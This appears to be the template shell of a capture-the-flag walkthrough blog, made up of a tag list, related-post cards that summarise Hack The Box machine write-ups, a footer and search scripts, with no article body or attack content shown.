  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hacking/">Hacking</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/machine/">Machine</a>
    
      
      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
    
      
      <a class="post-tag" href="/tags/medium/">Medium</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/cve/">cve</a>
    
      
      <a class="post-tag" href="/tags/easy/">Easy</a>
    
      
      <a class="post-tag" href="/tags/c/">c</a>
    
      
      <a class="post-tag" href="/tags/chroot/">chroot</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/2023/01/HTB/UpDown">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1674230400"
    data-df="ll"
    >
  Jan 21, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - UpDown</h3>
            <div class="text-muted small">
              <p>
                





                It took me a long time to get a foothold on that machine. But once I was in, getting the user and root was very easy.


  Room: UpDown
  Difficulty: Medium
  URL: https://app.hackthebox.com/machine...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/HackTheBox-Walkthrough-Ambassador/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1674835200"
    data-df="ll"
    >
  Jan 28, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Ambassador</h3>
            <div class="text-muted small">
              <p>
                





                This was a really fun box where I had to use multiple vulnerabilities. There was a Local File Inclusion (LFI), credentials stored in clear, misconfiguration, and a Git repository with a token in it...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/HackTheBox-Walkthrough-Awkward/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1677254400"
    data-df="ll"
    >
  Feb 25, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box Walkthrough - Awkward</h3>
            <div class="text-muted small">
              <p>
                





                This was a difficult box for me. I had to exploit a web application to get Remote Code Execution, find the user‚Äôs password in an notes file, then exploit the same application a second time to get r...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/htb-Squashed/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Squashead - Hack The Box</p>
  </a>
  

  
  <a href="/posts/HackTheBox-Walkthrough-Shoppy/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Hack The Box - Shoppy</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hacking/">Hacking</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/machine/">Machine</a>
    
      
      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
    
      
      <a class="post-tag" href="/tags/medium/">Medium</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/cve/">cve</a>
    
      
      <a class="post-tag" href="/tags/easy/">Easy</a>
    
      
      <a class="post-tag" href="/tags/c/">c</a>
    
      
      <a class="post-tag" href="/tags/chroot/">chroot</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    <!-- The Footer -->

<footer>
  <div class="container pl-lg-4 pr-lg-4">
    <div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3">
      <div class="footer-left">
        <p class="mb-0">
          ¬© 2023
          <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>.
          
          <span data-toggle="tooltip" data-placement="top"
            title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
          
        </p>
      </div>

      <div class="footer-right">
        <p class="mb-0">

          

          

          Powered by 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
           with 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
           theme.
        </p>
      </div>
    </div>
  </div>
  <div class="mt-auto d-flex flex-wrap justify-content-center align-items-center">
    <script src="https://www.hackthebox.eu/badge/1256978"></script>
    <script src="https://tryhackme.com/badge/50213"></script>
  </div>
</footer>


    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">A new version of content is available.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Update
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No results found.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

